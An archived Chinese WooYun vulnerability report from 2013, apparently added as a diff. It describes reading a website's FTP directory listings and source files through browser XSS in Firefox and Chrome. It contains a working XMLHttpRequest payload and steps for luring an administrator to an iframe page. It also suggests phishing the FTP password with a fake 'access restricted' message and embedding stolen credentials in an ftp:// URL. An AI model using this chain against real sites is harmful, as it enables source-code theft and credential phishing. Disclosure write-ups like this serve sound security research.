@@ -1,0 +1,247 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Firefox/chrome等FTP域内权限限制不严，可通过XSS遍历网站目录并获取源码。  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Firefox/chrome等FTP域内权限限制不严，可通过XSS遍历网站目录并获取源码。  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/爱梅小礼">爱梅小礼</a> 
+</li><li>提交时间：		2013-05-31 23:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-31：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-05-31：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">浏览器在FTP域内的CSRF问题，虽然遵守了同源策略，但不代表解决了所有问题。“可通过XSS遍历网站目录并获取源码”的环境要求有些苛刻，理论意义大于实际意义。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">只在IE9、firefox、chrome上做了测试，除IE之外，其他都同通过。<br />
+<br />
+<br />
+<br />
+首先明确一点，浏览器在任意协议下，不论是http(s)、File还是FTP、UNC、MHTML、<br />
+<br />
+Jar协议，遇到html扩展的文件都会进行渲染，当中的javascript同样会执行。<br />
+<br />
+再看FTP下的权限问题：当使用FTP协议渲染某个女HTML文件时，这个文件伪造的请求可获得指定目录列表，也有权限读取任意指定路径的文件内容。<br />
+<br />
+</p><pre><code>&lt;script&gt;<br />
+function createXMLHTTP()<br />
+{<br />
+    var xmlhttp = null;<br />
+    try<br />
+    {<br />
+        xmlhttp = new XMLHttpRequest();<br />
+    }<br />
+    catch (e)<br />
+    {<br />
+        try<br />
+        {<br />
+            xmlhttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);<br />
+        }<br />
+        catch (e)<br />
+        {<br />
+            xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+        }<br />
+    }<br />
+    return xmlhttp;<br />
+}<br />
+<br />
+var request = false;<br />
+request = createXMLHTTP();<br />
+xmlhttp=request;<br />
+xmlhttp.open(&quot;GET&quot;, &quot;/&quot;, false);//获取当前目录内容<br />
+//xmlhttp.open(&quot;GET&quot;, &quot;a.php&quot;, false);  //获取指定文件的内容<br />
+xmlhttp.send(null);<br />
+var ret = xmlhttp.responseText;<br />
+alert(ret);<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+如果目标环境满足如下条件，那么你可以使用这种方式遍历网站目录或者获取指定源码。<br />
+<br />
+1.管理员使用FTP管理网站<br />
+<br />
+2.网站允许你上传html文件，或者有存在dom xss的html文件。<br />
+<br />
+将你要读取的文件或目录写入payload.html（要想把获取的信息传到自己的服务器上只需多加几行代码即可，这里不再赘述），上传到网站中，假设你也能确定它的ftp路径：ftp://xx.com/upload/payload.html <br />
+<br />
+<br />
+<br />
+上传跨域用的xss.html到网站目录中：<br />
+<br />
+xss.html<br />
+<br />
+&lt;iframe src=ftp://xx.com/upload/payload.html&gt;&lt;/iframe&gt;<br />
+<br />
+假设上传后的路径为 http://xx.com/upload/xss.html<br />
+<br />
+诱骗管理员访问 http://xx.com/upload/xss.html<br />
+<br />
+最好的情况是管理员打开xss.html的同时，它也在登陆FTP或者会话未超时，再或者浏览器有记住ftp密码的功能，这样你便可以直接达成你的目的。<br />
+<br />
+如果不满足上述情况，浏览器就会弹出FTP的登陆框，除非遇到极品管理员顺手输入了密码，否则payload.html不会执行.那么我们可以做什么？你可以在xss.html中写入<br />
+<br />
+</p><pre><code>&lt;b&gt;访问受限，需要验证你的身份&lt;/b&gt;</code></pre><p class='detail'><br />
+<br />
+来进行钓鱼，骗他输入密码，当然成功率不敢保证。<br />
+<br />
+还有种条件下也可使用这种方式，便是你得到了管理员FTP密码，但FTP server进行了访问控制，只有管理员的IP可以连接到，那么你可将xss.html修改为（）：<br />
+<br />
+&lt;iframe src=ftp://username:passworld@xx.com/upload/payload.html&gt;&lt;/iframe&gt;<br />
+<br />
+其他步骤不变。<br />
+<br />
+承载着你一切猥琐梦想的Payload将在管理员的浏览器中静默的执行。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">这是Chrome和firefox通过上述代码获取了当前的FTP目录<br />
+<br />
+</p><p class="detail"><a href="../images/312206441d2b0a6dd22fb77b372e3e4551c82bcf.jpg" target="_blank"><img src="../images/312206441d2b0a6dd22fb77b372e3e4551c82bcf.jpg" alt="chrome.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/31220748ec5c8c00e4cce8c3cca6cb2749331973.jpg" target="_blank"><img src="../images/31220748ec5c8c00e4cce8c3cca6cb2749331973.jpg" alt="firefox.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这是firefox获取了指定文件的内容，chrome的就不截图了<br />
+<br />
+</p><p class="detail"><a href="../images/31220845d1c50e84289635357d9ada6326b6683e.jpg" target="_blank"><img src="../images/31220845d1c50e84289635357d9ada6326b6683e.jpg" alt="f.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+有朋友给我说这算不上是浏览器的漏洞，我不置可否。XSS算浏览器的漏洞吗？<br />
+<br />
+当然不算，那浏览器为什么要推XSS过滤器？何况IE已经注意到这个问题了，它的错误提示会告诉你“权限拒绝”。<br />
+<br />
+不管它是不是漏洞，它确实是存在的。<br />
+<br />
+<br />
+<br />
+                                                                           爱梅小礼·菜客@C.E.T<br />
+<br />
+                                                                            2013.5.31 夜 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你猜 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/爱梅小礼" title="爱梅小礼">爱梅小礼</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-024902" title="Firefox/chrome等FTP域内权限限制不严，可通过XSS遍历网站目录并获取源码。">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="24902";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
